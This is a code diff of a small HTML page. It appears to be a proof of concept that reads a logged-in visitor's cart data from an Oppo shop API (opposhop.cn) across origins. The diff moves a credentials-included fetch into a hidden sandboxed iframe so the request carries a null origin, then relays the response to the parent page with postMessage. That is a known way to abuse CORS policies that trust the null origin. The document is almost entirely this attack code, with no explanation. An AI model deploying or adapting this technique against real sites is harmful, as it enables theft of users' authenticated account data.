@@ -6,33 +6,37 @@
 
 <pre id="out"></pre>
 
+<iframe id="f" sandbox="allow-scripts" style="display:none"></iframe>
+
 <script>
 
 function run(){
 
+let code = `
+<script>
+
 fetch("https://www.opposhop.cn/cn/oapi/orders/web/cart/getCount",{
-
 method:"GET",
-
-mode:"cors",
-
-credentials:"include",
-
-headers:{
-"Accept":"*/*",
-"Accept-Language":"en-US,en;q=0.9"
-}
-
+credentials:"include"
 })
 .then(r=>r.text())
 .then(t=>{
-document.getElementById("out").textContent=t
+parent.postMessage(t,"*")
 })
 .catch(e=>{
-document.getElementById("out").textContent=e
+parent.postMessage(e.toString(),"*")
 })
 
+<\/script>
+`
+
+document.getElementById("f").srcdoc = code
+
 }
+
+window.addEventListener("message",e=>{
+document.getElementById("out").textContent = e.data
+})
 
 </script>
 
